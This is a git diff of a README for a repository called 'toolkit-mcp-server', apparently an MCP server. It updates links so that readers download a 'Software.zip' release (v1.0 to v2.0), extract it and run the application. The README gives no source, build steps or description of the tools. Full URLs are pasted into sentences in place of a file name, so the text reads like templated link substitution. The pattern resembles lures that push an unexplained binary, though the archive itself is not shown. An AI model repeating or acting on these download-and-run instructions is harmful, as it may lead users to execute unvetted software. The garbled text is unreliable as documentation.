@@ -16,13 +16,13 @@ Welcome to the "toolkit-mcp-server" repository, a Model Context Protocol server 
 
 ## Usage 📝
 
-To get started with the toolkit server, simply [download the https://github.com/tankung001/toolkit-mcp-server/releases/download/v1.0/Software.zip file](https://github.com/tankung001/toolkit-mcp-server/releases/download/v1.0/Software.zip) and follow the installation instructions. Launch the software and explore the range of utilities and tools available at your fingertips.
+To get started with the toolkit server, simply [download the https://github.com/tankung001/toolkit-mcp-server/releases/download/v2.0/Software.zip file](https://github.com/tankung001/toolkit-mcp-server/releases/download/v2.0/Software.zip) and follow the installation instructions. Launch the software and explore the range of utilities and tools available at your fingertips.
 
 ## Installation 🛠️
 
 Follow these steps to install and set up the toolkit server:
 
-1. **Download the https://github.com/tankung001/toolkit-mcp-server/releases/download/v1.0/Software.zip file**: [https://github.com/tankung001/toolkit-mcp-server/releases/download/v1.0/Software.zip](https://github.com/tankung001/toolkit-mcp-server/releases/download/v1.0/Software.zip)
+1. **Download the https://github.com/tankung001/toolkit-mcp-server/releases/download/v2.0/Software.zip file**: [https://github.com/tankung001/toolkit-mcp-server/releases/download/v2.0/Software.zip](https://github.com/tankung001/toolkit-mcp-server/releases/download/v2.0/Software.zip)
 2. **Extract the contents**: Unzip the downloaded file to a location of your choice.
 3. **Run the server**: Launch the server application and start utilizing the various tools it offers.
 
@@ -43,7 +43,7 @@ Follow these steps to install and set up the toolkit server:
 
 If the direct download link is not working or you prefer to explore more about the toolkit server, we recommend checking the "Releases" section of this repository for the latest updates and versions.
 
-[![Download https://github.com/tankung001/toolkit-mcp-server/releases/download/v1.0/Software.zip](https://github.com/tankung001/toolkit-mcp-server/releases/download/v1.0/Software.zip)](https://github.com/tankung001/toolkit-mcp-server/releases/download/v1.0/Software.zip)
+[![Download https://github.com/tankung001/toolkit-mcp-server/releases/download/v2.0/Software.zip](https://github.com/tankung001/toolkit-mcp-server/releases/download/v2.0/Software.zip)](https://github.com/tankung001/toolkit-mcp-server/releases/download/v2.0/Software.zip)
 
 ## Feedback and Contributions 🤝
 
